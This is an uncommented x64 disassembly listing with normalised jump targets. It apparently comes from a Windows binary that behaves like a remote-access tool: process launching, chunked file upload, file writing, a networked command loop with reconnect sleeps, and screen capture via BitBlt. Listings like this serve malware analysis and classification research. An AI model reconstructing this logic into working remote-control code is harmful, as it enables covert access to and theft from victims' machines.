test rax rax
mov rbx rax
je r-xdata
mov eax 0xffffffff
jmp r-xdata
mov eax 0xffffffff
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rax
call memset
mov r8d esi
mov rdx rbx
mov rcx rbp
call sub_10004db0
cmp eax esi
jne r-xdata
mov rsi [ rsp + 0x100 ]
mov rbp [ rsp + 0xf8 ]
add rsp 0xe8
retn
mov rbx [ rsp + 0xf0 ]
mov rdi [ rsp + 0x108 ]
mov rcx rbx
call ??3@YAXPEAX@Z
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
sub rcx 0x1
cmp rcx 0x104
jb r-xdata
lea eax [ rsi + 0x10 ]
lea rbp [ rbx + rcx + 0x2 ]
mov [ rsp + 0xe0 ] r12
movzx r12d [ rbx + rcx + 0x1 ]
movsxd rcx eax
call ??2@YAPEAX_K@Z
mov rcx 0xffffffffffffffff
mov [ rax ] 0x22
mov rdi rax
mov rsi rax
xor eax eax
[ rdi ]
xor edx edx
movzx ecx [ rbx + rdx ]
add rdx 0x1
test cl cl
mov [ rdi + rdx - 0x2 ] cl
jne r-xdata
mov rdi rsi
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
cmp [ rbp ] 0x0
je r-xdata
xor edx edx
lea rcx [ rsp + 0x50 ]
lea r8d [ rdx + 0x68 ]
call memset
mov eax [ rsp + 0x8c ]
test r12b r12b
mov edi 0x1
mov [ rsp + 0x50 ] 0x68
mov [ rsp + 0x90 ] 0x0
cmovne eax edi
neg r12b
sbb edx edx
xor ecx ecx
mov [ rsp + 0x8c ] eax
and edx 0x8000000
lea rax [ rsp + 0xc0 ]
xor r9d r9d
mov [ rsp + 0x48 ] rax
lea rax [ rsp + 0x50 ]
xor r8d r8d
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x28 ] edx
mov rdx rsi
mov [ rsp + 0x20 ] ecx
call [ CreateProcessA@IAT ]
mov rcx rsi
call ??3@YAXPEAX@Z
mov rcx rbx
call ??3@YAXPEAX@Z
mov r12 [ rsp + 0xe0 ]
mov eax edi
xor eax eax
mov rdi rsi
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov rcx 0xffffffffffffffff
mov [ rdi - 0x1 ] ax
xor eax eax
mov rdi rsi
[ rdi ]
xor ecx ecx
nop
nop
nop
movzx eax [ rcx + rbp ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
sub_1000b7e0
sub rsp 0x1a8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x160 ] rax
lea rdx [ rcx + 0x10 ]
lea r8 [ rsp + 0x50 ]
sub r8 rdx
nop
nop
nop
movzx eax [ rdx ]
add rdx 0x1
test al al
mov [ r8 + rdx - 0x1 ] al
jne r-xdata
mov [ rsp + 0x1c0 ] rbp
mov rbp [ rcx ]
mov [ rsp + 0x1c8 ] rsi
mov [ rsp + 0x188 ] r14
call ??3@YAXPEAX@Z
xor r14d r14d
mov [ rsp + 0x30 ] r14
lea rcx [ rsp + 0x50 ]
lea r8d [ r14 + 0x1 ]
xor r9d r9d
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rw-data ] 0x1
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rdx 0xffffffffffffffff
mov rsi rax
cmp rax rdx
je r-xdata
mov [ rsp + 0x1a0 ] rdi
mov rax rdx
mov ecx 0x400
cqo
mov [ rsp + 0x198 ] r12
mov [ rsp + 0x190 ] r13
and edx 0x3ff
add rax rdx
mov rdi rax
and eax 0x3ff
sub rax rdx
sar rdi 0xa
mov r13 rax
call ??2@YAPEAX_K@Z
xor edx edx
mov rcx rax
mov r8d 0x400
mov r12 rax
call memset
cmp rsi 0xffffffffffffffff
mov [ rsp + 0x40 ] r14d
je r-xdata
lea rdx [ rsp + 0x44 ]
mov rcx rax
mov [ rsp + 0x44 ] r14d
call [ GetFileSize@IAT ]
mov edx [ rsp + 0x44 ]
shl rdx 0x20
mov ecx eax
or rdx rcx
mov [ rsp + 0x40 ] 0x1
test rdi rdi
mov [ rsp + 0x1b8 ] rbx
mov rbx r14
je r-xdata
lea r9 [ rsp + 0x40 ]
mov edx 0xa010
mov r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x4
call sub_10004e70
mov rcx [ rbp + 0x30 ]
call [ SetEvent@IAT ]
mov rsi [ rsp + 0x1c8 ]
mov rbp [ rsp + 0x1c0 ]
mov rcx [ rsp + 0x160 ]
xor rcx rsp
call sub_10010a60
add rsp 0x1a8
retn
mov rcx rsi
call [ CloseHandle@IAT ]
test r13d r13d
mov rbx [ rsp + 0x1b8 ]
jle r-xdata
movdqa [ rsp + 0x170 ] xmm6
movsd xmm6 [ r--data ]
mov rcx r12
call ??3@YAXPEAX@Z
cmp rsi 0xffffffffffffffff
mov r14 [ rsp + 0x188 ]
mov r13 [ rsp + 0x190 ]
mov r12 [ rsp + 0x198 ]
mov rdi [ rsp + 0x1a0 ]
je r-xdata
cmp [ rsp + 0x40 ] r14d
jne r-xdata
movdqa xmm6 [ rsp + 0x170 ]
lea r9 [ rsp + 0x44 ]
mov r8d 0x400
mov rdx r12
mov rcx rsi
mov [ rsp + 0x20 ] r14
call [ ReadFile@IAT ]
mov r9 r12
mov edx 0xa00f
cvtsi2sd xmm5 rbx
cvtsi2sd xmm0 rdi
mov r8d 0xffffffff
mov rcx rbp
divsd xmm5 xmm0
mulsd xmm5 xmm6
cvttsd2si rax xmm5
mov [ rsp + 0x28 ] ax
mov [ rsp + 0x20 ] 0x400
call sub_10004e70
test eax eax
jle r-xdata
cmp [ rw-data ] r14d
je r-xdata
mov [ rsp + 0x40 ] 0x1
add rbx 0x1
cmp rbx rdi
jb r-xdata
lea r9 [ rsp + 0x44 ]
mov r8d r13d
mov rdx r12
mov rcx rsi
mov [ rsp + 0x20 ] r14
call [ ReadFile@IAT ]
mov r9 r12
mov edx 0xa00f
mov r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x28 ] r14w
mov [ rsp + 0x20 ] r13d
call sub_10004e70
test eax eax
jg r-xdata
cmp [ rw-data ] r14d
je r-xdata
jmp r-xdata
mov [ rsp + 0x40 ] 0x1
jmp r-xdata
sub_1000bab0
mov r11 rsp
sub rsp 0x148
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rdi
mov rdi rcx
mov ebx edx
lea rcx [ rsp + 0x20 ]
mov r8d 0x104
xor edx edx
call memset
lea rdx [ rsp + 0x20 ]
mov r8d ebx
mov rcx rdi
call sub_10004db0
cmp eax ebx
mov rbx [ rsp + 0x160 ]
jne r-xdata
mov rdi [ rsp + 0x168 ]
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x148
retn
mov ecx 0x218
call ??2@YAPEAX_K@Z
lea rcx [ rsp + 0x20 ]
lea rdx [ rsp + 0x20 ]
lea r8 [ rax + 0x10 ]
mov [ rax ] rdi
sub r8 rcx
nop
nop
nop
movzx ecx [ rdx ]
add rdx 0x1
test cl cl
mov [ r8 + rdx - 0x1 ] cl
jne r-xdata
lea rcx [ sub_1000b7e0 ]
mov r8 rax
xor edx edx
call [ _beginthread@IAT ]
sub_1000bb80
push rdi
cmp [ rcx ] 0x5c
mov rdx rcx
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
sub rcx 0x1
cmp ecx 0x1
jle r-xdata
cmp [ rcx + 0x1 ] 0x5c
jne r-xdata
pop rdi
retn
cmp [ rdx + 0x1 ] 0x3a
jne r-xdata
add rdx 0x2
cmp [ rdx ] 0x5c
jne r-xdata
cmp ecx 0x2
jne r-xdata
mov r9d 0x1
mov rcx rdx
xor r8d r8d
xor eax eax
pop rdi
retn
cmp ecx 0x3
jne r-xdata
lea eax [ rcx - 0x1 ]
pop rdi
retn
mov eax r9d
cmp dil 0x5c
jne r-xdata
jl r-xdata
xor r8d r8d
cmp [ rdx + 0x2 ] 0x5c
sete r8b
mov eax r8d
pop rdi
retn
add rdx r9
add eax r9d
jmp r-xdata
test eax eax
je r-xdata
add rdx 0x3
cmp [ rdx + 0x2 ] 0x5c
jne r-xdata
movzx edi [ rdx ]
test dil dil
je r-xdata
mov r9d r8d
cmp eax r9d
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rcx ] 0x2e
jmp r-xdata
lea rcx [ rdx + 0x1 ]
mov rdx rcx
jmp r-xdata
cmp [ rcx ] 0x2e
jne r-xdata
je r-xdata
mov eax r8d
cmp [ rcx + 0x1 ] 0x2e
sub_1000bc40
sub rsp 0x148
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
mov [ rsp + 0x158 ] rbx
mov rbx rcx
call sub_1000bb80
test eax eax
je r-xdata
mov rbx [ rsp + 0x158 ]
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x148
retn
xor eax eax
mov [ rsp + 0x160 ] rsi
mov [ rsp + 0x168 ] rdi
mov rdi rbx
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
cmp rcx 0x3
ja r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rbx
sub rdx rbx
mov eax 0x1
jmp r-xdata
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
mov esi 0x1
lea rcx [ rsp + 0x20 ]
lea edx [ rsi + 0x5b ]
call [ strchr@IAT ]
cmp [ rbx ] 0x5c
jne r-xdata
mov rsi [ rsp + 0x160 ]
mov rdi [ rsp + 0x168 ]
lea rcx [ rax + 0x1 ]
mov edx 0x5c
call [ strchr@IAT ]
mov rdi rax
cmp [ rbx + 0x1 ] 0x5c
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call [ CreateDirectoryA@IAT ]
test eax eax
jne r-xdata
mov [ rdi ] 0x0
lea edx [ rsi + 0x5b ]
lea rcx [ rsp + 0x22 ]
call [ strchr@IAT ]
test rax rax
je r-xdata
test rdi rdi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea rcx [ rax + 0x1 ]
mov edx 0x5c
call [ strchr@IAT ]
test rax rax
je r-xdata
mov eax esi
lea rcx [ rdi + 0x1 ]
mov edx 0x5c
mov [ rdi ] 0x5c
call [ strchr@IAT ]
mov rdi rax
jmp r-xdata
xor esi esi
test rdi rdi
je r-xdata
sub_1000bd90
mov r11 rsp
sub rsp 0x8a8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x890 ] rax
mov [ r11 + 0x18 ] rbx
mov rbx rcx
mov [ r11 + 0x20 ] rdi
mov edi edx
lea rcx [ r11 - 0x648 ]
mov r8d 0x208
xor edx edx
call memset
lea rdx [ rsp + 0x260 ]
mov r8d edi
mov rcx rbx
call sub_10004db0
cmp eax edi
jne r-xdata
mov rdi [ rsp + 0x8c8 ]
mov rbx [ rsp + 0x8c0 ]
mov rcx [ rsp + 0x890 ]
xor rcx rsp
call sub_10010a60
add rsp 0x8a8
retn
xor ecx ecx
nop
nop
movzx eax [ rsp + rcx + 0x260 ]
add rcx 0x1
test al al
mov [ rsp + rcx + 0x46f ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x260 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rdx [ rsp + rcx + 0x260 ]
lea rcx [ rsp + 0x680 ]
sub rcx rdx
movzx eax [ rdx ]
add rdx 0x1
test al al
mov [ rcx + rdx - 0x1 ] al
jne r-xdata
xor ecx ecx
movzx eax [ rsp + rcx + 0x470 ]
add rcx 0x1
test al al
mov [ rsp + rcx + 0x4f ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x50 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rax [ rcx - 0x1 ]
cdqe
cmp [ rsp + rax + 0x4f ] 0x5c
je r-xdata
xor eax eax
lea rdi [ rsp + 0x50 ]
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
lea rdx [ rsp + 0x680 ]
nop
nop
mov [ rsp + rax + 0x50 ] 0x5c
mov [ rsp + rax + 0x51 ] 0x0
movzx eax [ rdx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
cmp [ rsp + 0x470 ] al
mov [ rsp + 0x40 ] 0x1
je r-xdata
lea r9 [ rsp + 0x40 ]
mov edx 0xa010
mov r8d 0xffffffff
mov rcx rbx
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x4
call sub_10004e70
cmp [ rsp + 0x680 ] al
je r-xdata
lea rcx [ rsp + 0x470 ]
call sub_1000bc40
test eax eax
je r-xdata
cmp [ rsp + 0x40 ] 0x0
je r-xdata
xor r9d r9d
mov [ rsp + 0x30 ] 0x0
lea rcx [ rsp + 0x50 ]
lea r8d [ r9 + 0x3 ]
mov edx 0xc0000000
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x2
call [ CreateFileA@IAT ]
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx [ rbx + 0x30 ]
call [ SetEvent@IAT ]
mov [ rsp + 0x40 ] 0x0
mov [ rbx + 0x40 ] rax
jmp r-xdata
sub_1000bf80
sub rsp 0x38
mov [ rsp + 0x50 ] rbx
mov rbx rcx
mov [ rsp + 0x58 ] rdi
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea rdi [ rcx + rbx ]
xor ecx ecx
call [ rw-data ]
xor r9d r9d
mov r8 rdi
mov rdx rbx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
call [ rw-data ]
mov rcx rbx
call ??3@YAXPEAX@Z
mov rdi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
xor eax eax
add rsp 0x38
retn
sub_1000bff0
mov r11 rsp
sub rsp 0x178
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x150 ] rax
cmp edx 0x3
mov [ r11 + 0x20 ] rbp
mov [ r11 - 0x8 ] rsi
mov esi edx
mov rbp rcx
jg r-xdata
lea eax [ rdx + 0x8 ]
mov [ rsp + 0x190 ] rbx
mov [ rsp + 0x168 ] rdi
movsxd rdi eax
mov rcx rdi
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov eax 0xffffffff
jmp r-xdata
mov eax 0xffffffff
mov r8 rdi
xor edx edx
mov rcx rax
call memset
mov r8d esi
mov rdx rbx
mov rcx rbp
call sub_10004db0
cmp eax esi
jne r-xdata
mov rsi [ rsp + 0x170 ]
mov rbp [ rsp + 0x198 ]
mov rcx [ rsp + 0x150 ]
xor rcx rsp
call sub_10010a60
add rsp 0x178
retn
mov rcx rbx
call ??3@YAXPEAX@Z
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea eax [ rcx - 0x3 ]
lea rdi [ rcx - 0x1 ]
cmp eax 0x101
ja r-xdata
lea rcx [ rsp + 0x40 ]
mov rdx rbx
sub rcx rbx
nop
nop
nop
nop
movzx eax [ rdx ]
add rdx 0x1
test al al
mov [ rcx + rdx - 0x1 ] al
jne r-xdata
movsxd rax edi
cmp [ rsp + rax + 0x3f ] 0x5c
je r-xdata
lea eax [ rsi + 0x104 ]
movsxd rdi eax
mov rcx rdi
call ??2@YAPEAX_K@Z
test rax rax
mov rsi rax
je r-xdata
mov [ rsp + rax + 0x40 ] 0x5c
mov [ rsp + rax + 0x41 ] 0x0
mov r8 rdi
xor edx edx
mov rcx rax
call memset
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea rdx [ rcx + rbx ]
mov rcx rsi
nop
nop
nop
movzx eax [ rdx ]
add rcx 0x1
add rdx 0x1
test al al
mov [ rcx - 0x1 ] al
jne r-xdata
mov edx 0x2f
mov rcx rsi
call [ strrchr@IAT ]
test rax rax
mov r11 rax
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi r11
[ rdi ]
lea rdi [ rsp + 0x40 ]
not rcx
lea rdx [ rcx - 0x1 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
add rdx rcx
cmp rdx 0x104
jb r-xdata
lea edx [ rax + 0x2f ]
mov rcx rsi
call [ strrchr@IAT ]
test rax rax
mov r11 rax
je r-xdata
lea rdi [ rsp + 0x40 ]
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
nop
mov rcx rsi
call ??3@YAXPEAX@Z
mov rcx rbx
call ??3@YAXPEAX@Z
mov eax 0x1
jmp r-xdata
movzx eax [ r11 + rcx + 0x1 ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
lea rdx [ rsp + 0x40 ]
not rcx
add rcx rsi
nop
nop
mov rbx [ rsp + 0x190 ]
mov rdi [ rsp + 0x168 ]
movzx eax [ rdx ]
add rcx 0x1
add rdx 0x1
test al al
mov [ rcx - 0x1 ] al
jne r-xdata
lea rax [ rsp + 0x30 ]
lea r8 [ sub_1000bf80 ]
mov r9 rsi
mov [ rsp + 0x28 ] rax
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
call [ CreateThread@IAT ]
mov rcx rbx
call ??3@YAXPEAX@Z
mov eax 0x1
jmp r-xdata
sub_1000c290
mov rax rsp
sub rsp 0x338
mov [ rsp + 0x98 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov [ rax - 0x8 ] r12
mov [ rax - 0x10 ] r13
mov [ rax - 0x18 ] r14
mov [ rax - 0x20 ] r15
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x300 ] rax
mov rdi rcx
cmp [ rw-data ] 0x0
jne r-xdata
mov rcx [ rsp + 0x300 ]
xor rcx rsp
call sub_10010a60
mov rbx [ rsp + 0x340 ]
mov rbp [ rsp + 0x348 ]
mov rsi [ rsp + 0x350 ]
mov rdi [ rsp + 0x358 ]
mov r12 [ rsp + 0x330 ]
mov r13 [ rsp + 0x328 ]
mov r14 [ rsp + 0x320 ]
mov r15 [ rsp + 0x318 ]
add rsp 0x338
retn
mov [ rw-data ] 0x1
call sub_100102e0
xor ebp ebp
mov [ rsp + 0x68 ] rbp
cmp edi 0x64
je r-xdata
cmp [ rw-data ] ebp
jne r-xdata
call sub_10008040
mov [ rsp + 0x68 ] rax
lea rcx [ rsp + 0xc0 ]
call sub_10007d20
lea rdx [ rsp + 0x160 ]
mov cx 0x202
call [ rw-data ]
nop
nop
nop
xor r8d r8d
xor edx edx
lea rcx [ sub_10005db0 ]
call [ _beginthread@IAT ]
mov rbx rbp
mov [ rsp + 0x50 ] 0x0
mov rsi rax
xor edx edx
lea r8d [ rdx + 0x48 ]
lea rcx [ rsp + 0x110 ]
call memset
lea rcx [ rsp + 0x110 ]
call sub_10008970
mov [ rsp + 0x54 ] 0x0
mov r12d ebp
test r15d r15d
jle r-xdata
mov ecx 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov rax [ rsp + 0x60 ]
mov r12 rax
xor r13w r13w
mov r14d 0xffffffff
mov esi ebp
test r15d r15d
jle r-xdata
lea rbp [ rsp + 0xa0 ]
mov [ rw-data ] 0x0
mov ecx 0x1388
call [ Sleep@IAT ]
mov [ rsp + 0x54 ] ebp
lea r8 [ rsp + 0xc0 ]
lea rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x54 ]
call sub_10007e20
mov [ rsp + 0x60 ] rax
mov r15d [ rsp + 0x54 ]
test r15d r15d
jne r-xdata
mov rcx rax
call ??3@YAXPEAX@Z
cmp esi r15d
jge r-xdata
lea rbp [ rsp + 0xa0 ]
nop
cmp [ rsp + 0x134 ] 0x0
je r-xdata
mov edx [ rsp + 0x130 ]
mov [ rw-data ] dx
movzx edi r13w
mov r9d edi
mov r8 rsi
lea rcx [ rsp + 0x110 ]
call sub_10008590
mov rbx rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
movzx r8d r13w
mov rdx r14
shl rdx 0x6
lea rax [ rw-data ]
add rdx rax
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
movzx r9d [ rsp + 0x54 ]
mov rcx rbx
call sub_10009000
test eax eax
jg r-xdata
call [ rw-data ]
cmp eax 0x271d
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
add rsi rcx
add r12d 0x1
add rbp 0x4
cmp r12d r15d
jl r-xdata
mov edx [ rsp + 0x154 ]
mov [ rw-data ] dx
movzx edi r13w
mov r9d edi
mov r8 rsi
lea rcx [ rsp + 0x134 ]
call sub_10008780
mov rbx rax
test rax rax
je r-xdata
mov [ rsp + 0x54 ] 0x1
movsxd rdx r14d
shl rdx 0x6
lea rax [ rw-data ]
add rdx rax
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
mov r9w 0x1
mov r8d edi
mov rcx rbx
call sub_10009000
test eax eax
jg r-xdata
jmp r-xdata
mov rax [ rsp + 0x60 ]
xor ebp ebp
mov rcx rbx
call [ rw-data ]
xor ebx ebx
mov ecx 0x3e8
call [ Sleep@IAT ]
mov rcx rbx
call [ rw-data ]
xor ebx ebx
mov ecx 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov rdi [ rsp + 0x68 ]
test rdi rdi
je r-xdata
movzx r13d [ rbp ]
movzx r14d [ rbp + 0x2 ]
cmp [ rsp + 0x110 ] 0x0
je r-xdata
test rbx rbx
jne r-xdata
mov [ rsp + 0x54 ] 0x2
mov rdx r14
shl rdx 0x6
lea rax [ rw-data ]
add rdx rax
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
mov r9w 0x2
mov r8d edi
mov rcx rbx
call sub_10009000
test eax eax
jg r-xdata
mov rcx rbx
call [ rw-data ]
xor ebx ebx
mov ecx 0x3e8
call [ Sleep@IAT ]
mov [ rsp + 0x80 ] 0x1
mov [ rsp + 0x20 ] 0x4
lea r9 [ rsp + 0x80 ]
mov edx 0xffff
mov r8d 0x8
mov rcx rbx
call [ rw-data ]
xor edx edx
mov [ rsp + 0x74 ] edx
mov [ rsp + 0x78 ] edx
mov [ rsp + 0x88 ] ebp
xor eax eax
mov [ rsp + 0x8c ] eax
mov [ rsp + 0x90 ] eax
mov [ rsp + 0x5c ] ebp
mov [ rsp + 0x70 ] 0x1
mov [ rsp + 0x78 ] 0x2710
mov [ rsp + 0x74 ] 0x7530
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x38 ] rbp
lea rax [ rsp + 0x5c ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] 0xc
lea rax [ rsp + 0x88 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rdx + 0xc ]
lea r8 [ rsp + 0x70 ]
mov edx 0x98000004
mov rcx rbx
call [ rw-data ]
mov [ rsp + 0x58 ] 0xea60
mov [ rsp + 0x20 ] 0x4
lea r9 [ rsp + 0x58 ]
mov edx 0xffff
mov r8d 0x1005
mov rcx rbx
call [ rw-data ]
mov [ rsp + 0x20 ] 0x4
lea r9 [ rsp + 0x58 ]
mov edx 0xffff
mov r8d 0x1006
mov rcx rbx
call [ rw-data ]
call sub_10008c00
mov esi eax
mov [ rw-data ] r13w
mov ecx 0xf0
call ??2@YAPEAX_K@Z
mov [ rsp + 0x60 ] rax
test rax rax
je r-xdata
mov r13w [ rbp ]
mov [ rw-data ] r13w
movzx r14d [ rbp + 0x2 ]
xor r8d r8d
lea edx [ r8 + 0x1 ]
lea ecx [ rdx + 0x1 ]
call [ rw-data ]
mov rbx rax
xor eax eax
mov [ rsp + 0x100 ] eax
mov [ rsp + 0x104 ] eax
mov [ rsp + 0x108 ] eax
mov [ rsp + 0x10c ] eax
mov [ rsp + 0x100 ] 0x2
movzx ecx r13w
call [ rw-data ]
mov [ rsp + 0x102 ] ax
mov rcx r12
call [ rw-data ]
mov [ rsp + 0x104 ] eax
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
add r12 rcx
lea r8d [ rax + 0x10 ]
lea rdx [ rsp + 0x100 ]
mov rcx rbx
call [ rw-data ]
test eax eax
je r-xdata
add esi 0x1
add rbp 0x4
cmp esi r15d
jl r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
xor eax eax
mov [ rsp + 0x68 ] rax
xor ebp ebp
xor ebp ebp
mov rcx rbx
call [ rw-data ]
xor ebx ebx
mov ecx 0x3e8
call [ Sleep@IAT ]
mov rdi rbp
mov rdx rbx
mov rcx rax
call sub_10004660
mov rdi rax
jmp r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
mov rcx rbx
call [ rw-data ]
jmp r-xdata
test eax eax
je r-xdata
movzx eax [ rsp + 0x50 ]
mov [ rdi + 0x20 ] al
mov rcx rdi
call sub_10005a60
mov rcx rdi
call sub_10005400
call sub_10008c00
sub eax esi
cmp [ rdi + 0x24 ] 0x0
jne r-xdata
mov r8d eax
mov edx r14d
lea rcx [ rsp + 0xc0 ]
call sub_10007d50
lea rcx [ rsp + 0xc0 ]
call sub_10007dc0
sub_1000c8b0
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rsp + 0x48 ] rdi
xor edi edi
mov [ rcx + 0x58 ] rdi
mov [ rcx + 0x48 ] rdi
mov [ rcx + 0x50 ] rdi
mov ecx 0x428
call ??2@YAPEAX_K@Z
xor edx edx
mov r8d 0x428
mov rcx rax
mov [ rbx + 0x40 ] rax
call memset
mov edx 0x1
xor r9d r9d
xor ecx ecx
mov r8d edx
mov [ rbx + 0x2c ] edi
call [ CreateEventA@IAT ]
mov edx 0x1
xor r9d r9d
mov r8d edx
xor ecx ecx
mov [ rbx + 0x10 ] rax
call [ CreateEventA@IAT ]
lea rcx [ r--data ]
mov [ rbx + 0x70 ] rdi
mov [ rbx + 0x78 ] rdi
mov [ rbx + 0x88 ] rdi
mov [ rbx + 0x98 ] rdi
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x30 ] edi
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rdi [ rsp + 0x48 ]
mov [ rw-data ] rax
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
sub_1000c980
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x58 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call [ DeleteObject@IAT ]
mov rcx [ rbx + 0x50 ]
test rcx rcx
je r-xdata
call [ DeleteDC@IAT ]
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call [ DeleteDC@IAT ]
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call ??3@YAXPEAX@Z
mov rcx [ rbx + 0x88 ]
test rcx rcx
je r-xdata
call ??3@YAXPEAX@Z
mov rcx [ rbx + 0x98 ]
test rcx rcx
je r-xdata
call ??3@YAXPEAX@Z
xor eax eax
mov [ rbx + 0x58 ] rax
mov [ rbx + 0x48 ] rax
mov [ rbx + 0x50 ] rax
mov [ rbx + 0x70 ] rax
mov [ rbx + 0x78 ] rax
mov [ rbx + 0x88 ] rax
mov [ rbx + 0x98 ] rax
add rsp 0x20
pop rbx
retn
call ??3@YAXPEAX@Z
sub_1000ca20
sub rsp 0x58
mov rdx [ rcx + 0x58 ]
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x78 ] rdi
mov rdi rcx
mov rcx [ rcx + 0x50 ]
call [ SelectObject@IAT ]
mov rdx [ rdi + 0x48 ]
mov ecx [ rdi + 0x64 ]
mov r9d [ rdi + 0x60 ]
mov [ rsp + 0x40 ] 0xcc0020
xor esi esi
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] rdx
mov [ rsp + 0x20 ] ecx
mov rcx [ rdi + 0x50 ]
xor r8d r8d
xor edx edx
mov rbx rax
call [ BitBlt@IAT ]
mov rcx [ rdi + 0x50 ]
mov rdx rbx
call [ SelectObject@IAT ]
mov rax [ rdi + 0x40 ]
mov rbx [ rsp + 0x68 ]
mov [ rax ] 0x28
mov eax [ rdi + 0x60 ]
mov rcx [ rdi + 0x40 ]
mov [ rcx + 0x4 ] eax
mov rcx [ rdi + 0x40 ]
mov eax [ rdi + 0x64 ]
mov [ rcx + 0x8 ] eax
mov rax [ rdi + 0x40 ]
mov [ rax + 0xc ] 0x1
movzx eax [ rdi + 0x8 ]
mov rcx [ rdi + 0x40 ]
mov [ rcx + 0xe ] ax
mov rax [ rdi + 0x40 ]
mov [ rax + 0x10 ] esi
mov rax [ rdi + 0x40 ]
mov [ rax + 0x14 ] esi
mov rax [ rdi + 0x40 ]
mov [ rax + 0x18 ] esi
mov rax [ rdi + 0x40 ]
mov [ rax + 0x1c ] esi
mov rax [ rdi + 0x40 ]
mov [ rax + 0x20 ] esi
mov rax [ rdi + 0x40 ]
mov [ rax + 0x24 ] esi
mov eax [ rdi + 0x8 ]
cmp eax 0x4
jne r-xdata
cdq
and edx 0x7
add eax edx
sar eax 0x3
